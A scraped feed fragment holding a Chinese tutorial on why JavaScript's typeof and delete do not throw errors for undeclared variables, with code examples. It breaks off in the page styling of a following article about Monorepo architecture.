                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、背景与概念</h3>
<p>在 JavaScript 中，如果直接访问未声明的变量，如：</p>
<pre><code class="hljs language-arduino" lang="arduino">console.<span class="hljs-built_in">log</span>(name);
</code></pre>
<p>会抛出：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">ReferenceError:</span> name <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> defined
</code></pre>
<p>但是，使用：</p>
<pre><code class="hljs language-ini" lang="ini">typeof name<span class="hljs-comment">;</span>
delete name<span class="hljs-comment">;</span>
</code></pre>
<p>却不会报错，这给了我们一种“安全探测变量是否存在”的能力。<br/>
本文将深入解释原因、原理，并提供最佳实践示例。</p>
<hr/>
<h3 data-id="heading-1">二、语言设计原理：为什么 typeof 不会抛 ReferenceError？</h3>
<h4 data-id="heading-2"><strong>1. JavaScript 初期的设计目标</strong></h4>
<p>JS 在 1995 年设计时，需要：</p>
<ul>
<li>允许“弱错误”并继续执行</li>
<li>非专业程序员也能上手</li>
<li>有利于容错（浏览器脚本不能轻易崩溃整个页面）</li>
</ul>
<p>因此 <code>typeof</code> 被特意设计为 <strong>永远不会因为未声明变量而抛错</strong>。</p>
<hr/>
<h3 data-id="heading-3">三、typeof 的底层行为机制</h3>
<h4 data-id="heading-4"><strong>1. ECMAScript 规范：检查变量之前不触发 ReferenceError</strong></h4>
<p>伪流程：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">if</span> (变量声明存在)
    返回其类型字符串
<span class="hljs-keyword">else</span>
    返回 <span class="hljs-string">"undefined"</span>
</code></pre>
<p>这意味着：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">typeof</span> name; <span class="hljs-comment">// "undefined"，即使 name 未声明，也不会报错</span>
</code></pre>
<p>示例（带逐行注释）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 示例：检测一个可能不存在的变量</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> userProfile !== <span class="hljs-string">"undefined"</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"变量存在，可使用:"</span>, userProfile);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"变量不存在"</span>);
}
</code></pre>
<p><strong>逐行解释：</strong></p>
<ul>
<li><code>typeof userProfile</code> 不会触发错误</li>
<li>若变量未声明 → 返回字符串 <code>"undefined"</code></li>
<li>因此条件判断安全可靠</li>
</ul>
<hr/>
<h3 data-id="heading-5">四、delete 为什么也不会报错？</h3>
<p><code>delete</code> 的主要作用是删除对象属性，而不是变量。</p>
<p>例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">a</span>;
<span class="hljs-keyword">delete</span> obj.<span class="hljs-property">key</span>;
</code></pre>
<p>如果删除一个不存在的变量或属性，规范要求：</p>
<pre><code class="hljs language-arduino" lang="arduino">删除失败 → 返回 <span class="hljs-literal">false</span>（严格模式报错）
删除成功 → 返回 <span class="hljs-literal">true</span>
</code></pre>
<p>但非严格模式下：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">delete</span> name; <span class="hljs-comment">// name 未声明 → 返回 true，不报错</span>
</code></pre>
<p>这是为了浏览器脚本的容错设计。</p>
<hr/>
<h3 data-id="heading-6">五、如何利用 typeof 判断变量是否存在？（推荐用法）</h3>
<h4 data-id="heading-7"><strong>通用写法</strong></h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> someVar !== <span class="hljs-string">"undefined"</span>) {
    <span class="hljs-comment">// 安全使用该变量</span>
}
</code></pre>
<h4 data-id="heading-8">示例：根据全局变量切换运行模式</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 若 globalConfig 存在，优先使用</span>
<span class="hljs-type">const</span> config = (typeof globalConfig !== <span class="hljs-string">"undefined"</span>)
    ? globalConfig
    : { debug: <span class="hljs-literal">false</span>, mode: <span class="hljs-string">"default"</span> };

console.<span class="hljs-built_in">log</span>(config);
</code></pre>
<p><strong>逐行解释：</strong></p>
<ul>
<li>安全检查变量是否声明</li>
<li>若存在则使用</li>
<li>若不存在不报错并使用默认配置</li>
</ul>
<hr/>
<h3 data-id="heading-9">六、不要使用 try...catch 判断变量是否存在（反例）</h3>
<p>错误示例：</p>
<pre><code class="hljs language-ini" lang="ini">let exists<span class="hljs-comment">;</span>

try {
    name<span class="hljs-comment">; // name 未声明</span>
    <span class="hljs-attr">exists</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
} catch {
    <span class="hljs-attr">exists</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
}
</code></pre>
<p>虽然可行，但效率低、不优雅，也不符合 JS 设计初衷。<br/>
<code>typeof</code> 才是官方推荐的方式。</p>
<hr/>
<h3 data-id="heading-10">七、对比：声明但值为 undefined 与未声明变量的区别</h3>
<h4 data-id="heading-11"><strong>1. 变量声明但未赋值</strong></h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">let</span> a;
<span class="hljs-keyword">typeof</span> a; <span class="hljs-comment">// "undefined"</span>
</code></pre>
<h4 data-id="heading-12"><strong>2. 根本未声明变量</strong></h4>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">typeof</span> <span class="hljs-selector-tag">b</span>; <span class="hljs-comment">// "undefined" —— 不报错</span>
<span class="hljs-selector-tag">b</span>;        <span class="hljs-comment">// ReferenceError —— 报错</span>
</code></pre>
<p>表格区分：</p>




















<table><thead><tr><th>情况</th><th>typeof 结果</th><th>直接访问</th></tr></thead><tbody><tr><td>已声明但未赋值</td><td>"undefined"</td><td>值为 undefined</td></tr><tr><td>未声明变量</td><td>"undefined"</td><td>ReferenceError</td></tr></tbody></table>
<p>因此，<strong>只有 typeof 能区分安全访问与直接访问的区别</strong>。</p>
<hr/>
<h3 data-id="heading-13">八、再扩展：检测全局变量的另一种安全方式</h3>
<p>在浏览器全局作用域中：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-string">"Vue"</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Vue 已加载"</span>);
}
</code></pre>
<p>但是此方法不能判断局部变量是否存在，因此<br/>
<strong>typeof 是最万能、适用所有作用域的方式</strong>。</p>
<hr/>
<h3 data-id="heading-14">九、潜在问题与注意事项</h3>
<h4 data-id="heading-15">❌ 不要用 typeof null 判断对象类型</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">typeof</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// "object" —— 历史遗留 bug</span>
</code></pre>
<h4 data-id="heading-16">❌ typeof 不能判断变量是否已初始化（TDZ 问题）</h4>
<p>在 ES6 的块级作用域中：</p>
<pre><code class="hljs language-ini" lang="ini">console.log(typeof x)<span class="hljs-comment">; // ❌ ReferenceError (在 TDZ 中)</span>
let <span class="hljs-attr">x</span> = <span class="hljs-number">10</span><span class="hljs-comment">;</span>
</code></pre>
<p>只有<strong>完全未声明</strong>才不会报错。</p>
<h4 data-id="heading-17">❌ delete 不适合作为变量存在性检查</h4>
<p><code>delete</code> 的语义是删除属性，不是检测变量，也不保证跨作用域一致性。</p>
<hr/>
<h2 data-id="heading-18">十、总结要点</h2>
<ul>
<li><code>typeof</code> 永远不会因为未声明变量而报错</li>
<li>它是 <strong>唯一安全判断变量是否存在的方式</strong></li>
<li><code>delete</code> 删除不存在的变量在非严格模式下不报错</li>
<li>推荐检查变量存在性的方式：</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> someVar !== <span class="hljs-string">"undefined"</span>) {
    <span class="hljs-comment">// safe</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-19">完整示例：可直接运行</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkVar</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-comment">// 安全探测变量是否存在</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span>[name] !== <span class="hljs-string">"undefined"</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`变量 <span class="hljs-subst">${name}</span> 存在，值为：`</span>, <span class="hljs-variable language_">window</span>[name]);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`变量 <span class="hljs-subst">${name}</span> 不存在`</span>);
    }
}

<span class="hljs-comment">// 测试</span>
<span class="hljs-title function_">checkVar</span>(<span class="hljs-string">"abc"</span>);  <span class="hljs-comment">// 未声明变量，不报错</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">abc</span> = <span class="hljs-number">123</span>;
<span class="hljs-title function_">checkVar</span>(<span class="hljs-string">"abc"</span>);  <span class="hljs-comment">// 变量已经存在</span>
</code></pre>
<hr/>
<h2 data-id="heading-20">✨ 本文结语</h2>
<p>本文部分内容借助 AI 辅助生成，并由作者整理审核。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🧭 2025 年「大前端 Monorepo 架构」最佳实践指南]]></title>    <link>https://juejin.cn/post/7581676787380928531</link>    <guid>https://juejin.cn/post/7581676787380928531</guid>    <pubDate>2025-12-10T01:54:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581676787380928531" data-draft-id="7581738974424498195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🧭 2025 年「大前端 Monorepo 架构」最佳实践指南"/> <meta itemprop="keywords" content="前端,前端框架,前端工程化"/> <meta itemprop="datePublished" content="2025-12-10T01:54:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🧭 2025 年「大前端 Monorepo 架构」最佳实践指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:54:43.000Z" title="Wed Dec 10 2025 01:54:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAAQlBMVEVHcEwlRnqtZBj76q4lRnolRnolRnolRnolRnokRnr/gGtrVUeLXDBKTl+hYSHasW7Ik0zs0JG4dCvUdEE0SW+rYxrLQJfjAAAACnRSTlMA////0H/xUaMi5MCoTwAACfVJREFUeNrtnQl3qygUgJ9GXAqosfL//+pgmgXwXmRNJGdu55xO+6rx8+6I8O9fehmGriN93zdN07bVXdpW/ih/SbpuGP6dXbpOXv7z2i3S9ISck2eQOnAhMHG64VQQbmrAaM4B05GmipaGdB+m6BNQPBXzMYtKR3EPbB/RS5eY4g+lIW9WBqnySCvVMrzRpqqs0g9nwVg5p1KYlHEchRT5bftp+y3n6xlQDjAkABtrKULU9f377ev+4/1/NiT+URRiZRhrcZP6WLa/Gq005BORaqXsdYEuHPIP798ZxSyt6d5sVfxJESRCsvB32lfXwhRjnUBGmKXNoJQe04VIASJqRC/9G7yDsyQMiloYz+0pHYghEoPISAGgpDSvHsCoMwmA0mfjSG5UOsqah2RodkljzMkhZZdamiEDB8+Nsbk9T04yGNljDXGOZZ6u0+Tj9DuvbyNJBuPO0ABtLNPlJtfZJ4CNNCWJoY8gddwxNpm9YrHh9DEkBoeMud4Kma8XRZaYpBJOYvg59U9wOsblMvmGrzQe30dyqFZ1dxPfO0FT5BOdw989THVs4q1TFk+iN4PMu7CaLpd4EJOExNaJLE4d0xQKYpJ0cY5Ozcwwu6WOu2cs9TUYxPB4b4fvLRzTUXbT1HH7y0BnB0j6CAehkPFfFzd1TMsi6sU1/P4VM9NiISHBlYnBMR+kad075sXlmMehj1twnfTUqJH4GJfqIKte7S72emPnHbdiYHIB0e6ATjKq1UoTaFh6wBL2csMIVo9fH/v6QRHAgoxrOHQQxG/36tC1ODmGOeBGBRmXalgcdhDQ1xF1vI6a3DF2d4r7G1enOUgNOshlFq7qUCxrca9ldiCam7ilxRbP6JbOYsYtfLFmkcXEgLG1DN/6eroxHjqh5bh+Uw27e1oWVK7pN+AqwzUcq/UYTPw8nWufLFBHN2zcxLRYlmGPs6rA2Wy0uJe/E7TknbHIa1WH1bLA8DAj3JpxET+FCNCWZ5uNT6jxTPZK/1mXoCBeKlGLRT2lP69XN3XdqqCojKX1ZVda6iD2McjeXSHa0I+AHd2InGAJgjRVM6gOBfygDrarRJnho6eQBbrns+HkcNUCWtYClJa66qFgPbqqZEBTCOAgRqxCOhQBWpZeIC6QBq91hEoI5unTjsMsK9DCFigY9WNn19hgVCrELalrTw6WnYMYzjHhQ2/7G2xTx1HvwpzSe4cVi5ORQQwMW9+72FU5L4gGsa6Yu1RcDeIhs64Qs8izt0vGH+n9/IKaIlYpM2UqkYOrwwq5CgBjWpyGtxaonxe4KaJ3hx+7O0HaqVkxLBPj8FmBVmjNevIUFhUuDmMq5NDV9RwyPe/95IvxAhG7ymqxHGE5sZJL2kPLUhUinkXfrnFwGFwXD99djNLSFh/meXEb2B6Oyiwm0I7BC+OlTlOVPk9K8CIYzu5YHwKDTI6XAo5lz3WEqEXwQRKhh5cyLa6D81P4PXBw984as9YaGXHwx4Ba8rmOldUat/BHt9cQ38AaljnBdCJqs60OcXVDJZP//ZwSWtV9FpHNtgg22KuYx/U2tB5Mcp1TYOiphNhiFjgWeJ3DL2OZpuuUisIoUyzZEJ76I+LmyqWdv8LwnEiwMYczihjxeqtBsuFJSTg2oD1ETQx4v6D1VleSZW1xCwvAfVGWpQ069kgrQksAUW2rReYzsboIjSABuDQX0QJwB9cnZVgWVgE31vrklAJnEmVObykgYCk/VGX5OlpuKb5eiovUAvJ2tMstw0kIkNdpiSA91K6XA6K8CVCyr4PePhTo65q3DyX7OpTbSVk1PB62mhJ9HSpSqtKaESxsFRm0tLBVcvTV+vbBrLRK4hC7aitN9B0ZpX6vNMgjGIt5ZdmMv32KrmprD1afsPd4FEhThK0+WfTl3kpd482AGvG3jQdZK1+t8ireDswhofigRb3fxfI/4jj+xkffUX/1ccxxhEP9qyyBEH9Cx9vhf8TB7eiSpBHjZVSa4whQMJC1TqIR6q8RERtjOr2ID0yx3oYi0oAIvZCPz4eG64p3ObuREeOHUIR3MBVJwq9yll5P7KHdiPBOiOoRa/AjXz21J3k04l+i8OjErj4kaXWQiIVO/EvA+KLRAEnUVomtjPd6SvR3RLoeMT54nKFH1EqtkkEGFaQuTlSQrsxhRiOIt51S/Ho8B11+FUlwRaHnU4utEI38/mgSjRJ8PhWEtN6Z6WcncQOU4efjKoh3zfi7/+DfhPrwOZ9a/iYBiVJJxPlei3CqIDTYEqAPFow5/c71fAdVIwmo4n+cTIGbr2n9NULAE5ifcNNS63hvEOFk0wxYnICBBZ0I9xERBVILF0uggNdxuOkR4S6ngvgPmArzHv4KpMKGQFjQ+Rw6q9dC6R6dgZaJF7RVWIH0BTY9h+fz0ohHOyLuy+He/hN4GUR3/RxcBx2f76izarI9CaXmzRmhNQuSfIgJkva5GzN6HJbhQxCNsDGDSh56plmef6sg2eaXPsYBt5W+H6VE6omG6hOS1w4hiTWiThbJ1YO+RSO1vrpMlomf6nhQGz0m7qT6W04XOUHyzhZ4rkG+0hxL66oDW9mnPWyL3TMmssxyQUwr01CHX7b2OvUIaqS48TnMtAoEQTQixJeAlDfSiGmk/l8jpwIpTyFqOfeNIHWBooC036ERtUQp2tm/CKT5jjySbxTlvUVj2yhjvyWDVL3yfKRojXwLSEWUp7q0PBAKPp7m5YGoT3WH7wAZ1BeOywNZv3Gak/LIqriwxbQ5jaTcsEW1eb+FvoWo+zr5V/IUOvNtsapU2zJXSyj0xVB13sPfq0kkZA7dubIIKXIlJ8Cy7u+BN22RVcr+peOuxHdcBbA04FAVmEoEtO5vX55K4KVZS1QJvBBzU1rgUl8JapBNYIowLoZtD9NWRTWKqqe36L48BSz8QPH9epqqIDehlh2UuqocEmrdV7AvhuRoM74m80yeDIEX3ppreNN235FxV58DNjhswn5K8zK21+5ctjut6NmUIoy9tVvitnHr2VDM3ahtW8KQ/Vbsp9GGiWHfk8skyTSFz9/HdxhHe4uR/RxX/mG1SGXwypcDJNmCMfucZ/C1CuCQUbiBUDYbe7tiRkZX8GIat50d+wqR1fdN7ygGzrHrcN4kGFHK02cil5M6INgQVsvnNz77T5PqUFYJJInYmIBplJfP5On4eiOwYfhuCD44oLyYVs43rI1rk3H7usttzq8Qo3j84vavN9mOkAeuq8dHEd9NtCVKX51Oen+MM6IEYvz5StOehKLpIjD+nKU5AQWJpLizdB+1sb5LQvFRxbSJVGHmSdK/0WWaPguEYmcSJ68aWkK6rAw6jwSSCmrTWVHT96R7HwHANEgqybVJL+E2vE2q7Uu91Gr73SbbNUvZDtiOlCeIv4r/AI+0XUwz1lvcAAAAAElFTkSuQmCC")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAAQlBMVEVHcEwlRnqtZBj76q4lRnolRnolRnolRnolRnokRnr/gGtrVUeLXDBKTl+hYSHasW7Ik0zs0JG4dCvUdEE0SW+rYxrLQJfjAAAACnRSTlMA////0H/xUaMi5MCoTwAACfVJREFUeNrtnQl3qygUgJ9GXAqosfL//+pgmgXwXmRNJGdu55xO+6rx8+6I8O9fehmGriN93zdN07bVXdpW/ih/SbpuGP6dXbpOXv7z2i3S9ISck2eQOnAhMHG64VQQbmrAaM4B05GmipaGdB+m6BNQPBXzMYtKR3EPbB/RS5eY4g+lIW9WBqnySCvVMrzRpqqs0g9nwVg5p1KYlHEchRT5bftp+y3n6xlQDjAkABtrKULU9f377ev+4/1/NiT+URRiZRhrcZP6WLa/Gq005BORaqXsdYEuHPIP798ZxSyt6d5sVfxJESRCsvB32lfXwhRjnUBGmKXNoJQe04VIASJqRC/9G7yDsyQMiloYz+0pHYghEoPISAGgpDSvHsCoMwmA0mfjSG5UOsqah2RodkljzMkhZZdamiEDB8+Nsbk9T04yGNljDXGOZZ6u0+Tj9DuvbyNJBuPO0ABtLNPlJtfZJ4CNNCWJoY8gddwxNpm9YrHh9DEkBoeMud4Kma8XRZaYpBJOYvg59U9wOsblMvmGrzQe30dyqFZ1dxPfO0FT5BOdw989THVs4q1TFk+iN4PMu7CaLpd4EJOExNaJLE4d0xQKYpJ0cY5Ozcwwu6WOu2cs9TUYxPB4b4fvLRzTUXbT1HH7y0BnB0j6CAehkPFfFzd1TMsi6sU1/P4VM9NiISHBlYnBMR+kad075sXlmMehj1twnfTUqJH4GJfqIKte7S72emPnHbdiYHIB0e6ATjKq1UoTaFh6wBL2csMIVo9fH/v6QRHAgoxrOHQQxG/36tC1ODmGOeBGBRmXalgcdhDQ1xF1vI6a3DF2d4r7G1enOUgNOshlFq7qUCxrca9ldiCam7ilxRbP6JbOYsYtfLFmkcXEgLG1DN/6eroxHjqh5bh+Uw27e1oWVK7pN+AqwzUcq/UYTPw8nWufLFBHN2zcxLRYlmGPs6rA2Wy0uJe/E7TknbHIa1WH1bLA8DAj3JpxET+FCNCWZ5uNT6jxTPZK/1mXoCBeKlGLRT2lP69XN3XdqqCojKX1ZVda6iD2McjeXSHa0I+AHd2InGAJgjRVM6gOBfygDrarRJnho6eQBbrns+HkcNUCWtYClJa66qFgPbqqZEBTCOAgRqxCOhQBWpZeIC6QBq91hEoI5unTjsMsK9DCFigY9WNn19hgVCrELalrTw6WnYMYzjHhQ2/7G2xTx1HvwpzSe4cVi5ORQQwMW9+72FU5L4gGsa6Yu1RcDeIhs64Qs8izt0vGH+n9/IKaIlYpM2UqkYOrwwq5CgBjWpyGtxaonxe4KaJ3hx+7O0HaqVkxLBPj8FmBVmjNevIUFhUuDmMq5NDV9RwyPe/95IvxAhG7ymqxHGE5sZJL2kPLUhUinkXfrnFwGFwXD99djNLSFh/meXEb2B6Oyiwm0I7BC+OlTlOVPk9K8CIYzu5YHwKDTI6XAo5lz3WEqEXwQRKhh5cyLa6D81P4PXBw984as9YaGXHwx4Ba8rmOldUat/BHt9cQ38AaljnBdCJqs60OcXVDJZP//ZwSWtV9FpHNtgg22KuYx/U2tB5Mcp1TYOiphNhiFjgWeJ3DL2OZpuuUisIoUyzZEJ76I+LmyqWdv8LwnEiwMYczihjxeqtBsuFJSTg2oD1ETQx4v6D1VleSZW1xCwvAfVGWpQ069kgrQksAUW2rReYzsboIjSABuDQX0QJwB9cnZVgWVgE31vrklAJnEmVObykgYCk/VGX5OlpuKb5eiovUAvJ2tMstw0kIkNdpiSA91K6XA6K8CVCyr4PePhTo65q3DyX7Op